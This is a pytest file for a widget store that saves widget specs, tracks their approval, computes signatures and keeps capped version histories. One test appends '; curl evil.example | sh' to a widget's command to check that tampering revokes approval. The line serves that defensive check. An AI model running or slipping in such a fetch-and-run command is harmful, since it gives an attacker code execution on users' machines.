SPEC = {"name": "CPU Meter", "width": 200, "height": 100, "position": "center",
        "commands": {"cpu": {"cmd": "cat /proc/loadavg", "interval": 2}}, "html": "<html></html>"}


def test_save_and_roundtrip(store):
    manifest = store.save_spec(SPEC, approved=True, prompt="cpu please")
    assert manifest["id"].startswith("cpu-meter-")
    assert store.to_spec(store.load(manifest["id"])) == {**SPEC, "engine": "html"}
    assert store.load(manifest["id"])["history"] == ["cpu please"]
    assert [m["id"] for m in store.list_widgets()] == [manifest["id"]]


def test_approval_is_invalidated_by_command_changes(store):
    manifest = store.save_spec(SPEC, approved=True)
    assert store.is_approved(manifest)
    manifest["commands"]["cpu"]["cmd"] += "; curl evil.example | sh"
    assert not store.is_approved(manifest)


def test_unapproved_by_default(store):
    assert not store.is_approved(store.save_spec(SPEC))


def test_widget_without_commands_needs_no_approval(store):
    assert store.is_approved(store.save_spec({**SPEC, "commands": {}}))


def test_signature_ignores_position(store):
    manifest = store.save_spec(SPEC)
    before = store.signature(manifest)
    assert store.signature({**manifest, "x": 10, "y": 20}) == before
    store.html_path(manifest["id"]).write_text("<html>changed</html>")
    assert store.signature(manifest) != before


def test_changes_touch_the_stamp_and_delete_removes(store):
    manifest = store.save_spec(SPEC)
    first = store.STAMP.read_text()
    store.delete(manifest["id"])
    assert store.STAMP.read_text() != first
    assert store.list_widgets() == []


NATIVE = {"name": "Clock", "engine": "native", "width": 200, "height": 80, "position": "center", "commands": {},
          "ui": {"type": "label", "text": "{now|time:%H:%M}"}}


def test_native_roundtrip_and_engine_switch(store):
    manifest = store.save_spec(NATIVE)
    assert manifest["engine"] == "native"
    assert store.ui_path(manifest["id"]).exists() and not store.html_path(manifest["id"]).exists()
    assert store.to_spec(store.load(manifest["id"])) == NATIVE
    before = store.signature(store.load(manifest["id"]))
    # Converting to html replaces the content file, so nothing stale is left behind.
    store.save_spec({**SPEC, "engine": "html"}, widget_id=manifest["id"])
    assert store.html_path(manifest["id"]).exists() and not store.ui_path(manifest["id"]).exists()
    assert store.signature(store.load(manifest["id"])) != before


def _spec(**changes):
    base = {"name": "W", "engine": "native", "width": 100, "height": 50, "position": "top-left",
            "commands": {}, "ui": {"type": "label", "text": "v0"}}
    return {**base, **changes}


def test_updates_keep_earlier_versions(store):
    m = store.save_spec(_spec(), prompt="first")
    store.save_spec(_spec(ui={"type": "label", "text": "v1"}), m["id"], prompt="second")
    store.save_spec(_spec(ui={"type": "label", "text": "v2"}), m["id"], prompt="third")
    versions = store.versions(m["id"])
    assert [v["spec"]["ui"]["text"] for v in versions] == ["v0", "v1"]   # oldest first
    assert [v["label"] for v in versions] == ["first", "second"]         # the prompt that made it
    assert store.load_ui(m["id"])["text"] == "v2"


def test_unchanged_saves_add_no_version(store):
    m = store.save_spec(_spec())
    store.save_spec(_spec(), m["id"])
    assert store.versions(m["id"]) == []


def test_versions_are_capped(store):
    m = store.save_spec(_spec())
    for i in range(store.VERSIONS_KEPT + 5):
        store.save_spec(_spec(ui={"type": "label", "text": f"v{i + 1}"}), m["id"])
    versions = store.versions(m["id"])
    assert len(versions) == store.VERSIONS_KEPT
    assert versions[-1]["spec"]["ui"]["text"] == f"v{store.VERSIONS_KEPT + 4}"


def test_live_fields_do_not_change_the_signature(store):
    m = store.save_spec(_spec())
    before = store.signature(m)
    m.update(x=10, y=20, locked=True, click_through=True)
    assert store.signature(m) == before
    m["monitor"] = 1                     # moving to another monitor re-places the widget
    assert store.signature(m) != before
